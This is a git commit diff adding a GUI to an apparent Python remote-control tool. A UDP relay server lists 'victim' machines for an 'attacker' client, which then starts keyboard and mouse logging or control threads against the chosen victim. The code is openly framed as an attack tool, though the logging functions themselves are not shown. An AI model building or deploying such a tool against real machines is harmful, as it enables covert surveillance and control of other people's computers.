bd5a2e0b3303d891f39e5ff011989781833c2763
mrvs0 <mrvs025@gmail.com>
2023-02-21 23:02:50 +0200

    gui

--- python/client/client.py
+++ python/client/client.py
@@ -1,33 +1,49 @@
-import socket
-import time
-import threading
-import functions
 from functions import *
+from gui import *
+
+ip_of_victim = ''
+ip_of_server = ("192.168.1.211", 8200)
+
+
+def parser(s: socket.socket):
+    while True:
+        data, ip = s.recvfrom(1024)
+        data = data.decode()
+        if data.startswith("additional_option"):
+            data = data[17:]
+            update_options(data)
+        elif data.startswith("options"):
+            data = data[7:]
+            if data:
+                for option in data.split('\n'):
+                    update_options(option)
+        elif data.startswith("hello i am ur victim"):
+            F.ip = ip
+            threading.Thread(target=log_keyboard, daemon=True).start()
+            threading.Thread(target=log_mouse, daemon=True).start()
+            destroy()
 
 
 def main():
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    client.sendto("attacker".encode(), ip_of_server)
+    threading.Thread(target=parser, args=(client,)).start()
     F.s = client
-    client.sendto("attacker".encode(), ("192.168.1.211", 8200))
-    print(client.recvfrom(1024)[0].decode())
-    ip_of_victim = ''
+    D.s = client
+    D.ip_of_server = ip_of_server
     msg = 'change'
+    client.sendto("request_options".encode(), ip_of_server)
+    init()
     while msg != "exit":
+        print("exit or change: ")
+        msg = input()
         if msg == 'change':
-            # if F.flag:
-            #     client.sendto('u are free'.encode(), ip_of_victim)
-            F.flag = False
-            choice = int(input('choose: ')) - 1
-            client.sendto(f"choice{choice}".encode(), ("192.168.1.211", 8200))
-            client.recvfrom(1024)[0].decode()
-            c, ip_of_victim = client.recvfrom(1024)
-            F.ip = ip_of_victim
-            F.flag = True
-            threading.Thread(target=log_keyboard, daemon=True).start()
-            threading.Thread(target=log_mouse, daemon=True).start()
-        msg = input("exit or change: ")
+            client.sendto("request_options".encode(), ip_of_server)
+            init()
+        F.flag = False
 
-    client.sendto("attacker exit".encode(), ("192.168.1.240", 8200))
+    client.sendto("attacker exit".encode(), ip_of_server)
+    time.sleep(1)
     client.close()
 
 
--- python/server/server.py
+++ python/server/server.py
@@ -1,14 +1,19 @@
 import socket
 
 
-def send_options(victims_ips: list):
-    st = ''
+def send_options(victims_ips: list, s: socket.socket, ip: tuple):
+    st = 'options'
+    if not victims_ips:
+        s.sendto(st.encode(), ip)
+        return
+    st = 'options'
     for i, ap in enumerate(victims_ips):
         st += f'{i + 1}) {ap}\n'
-    return st
+    s.sendto(st[:-2].encode(), ip)
 
 
 def main():
+    is_currently_attacking = False
     socket_of_server = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     socket_of_server.bind(("0.0.0.0", 8200))
     victims_ips = []
@@ -20,11 +25,16 @@ def main():
             case "victim":
                 if ip not in victims_ips:
                     victims_ips.append(ip)
+                    if not is_currently_attacking and ip_of_attacker:
+                        socket_of_server.sendto(f'additional_option{len(victims_ips)}) {ip}'.encode(), ip_of_attacker)
                 print(ip)
             case "attacker":
+                is_currently_attacking = False
                 ip_of_attacker = ip
                 print(ip)
-                socket_of_server.sendto(send_options(victims_ips).encode(), ip)
+            case "request_options":
+                is_currently_attacking = False
+                send_options(victims_ips, socket_of_server, ip)
             case "attacker exit":
                 ip_of_attacker = ''
             case other:
@@ -33,10 +43,12 @@ def main():
                     if choice < len(victims_ips):
                         print(choice)
                         socket_of_server.sendto(
-                            str(victims_ips[choice])[1:-1].replace("'", "").replace(",", "").encode(),
+                            ("ip_of_victim" + str(victims_ips[choice])[1:-1].replace("'", "").replace(",",
+                                                                                                      "")).encode(),
                             ip_of_attacker)
                         socket_of_server.sendto(str(ip_of_attacker)[1:-1].replace("'", "").replace(",", "").encode(),
                                                 victims_ips[choice])
+                        is_currently_attacking = True
 
     socket_of_server.close()
 
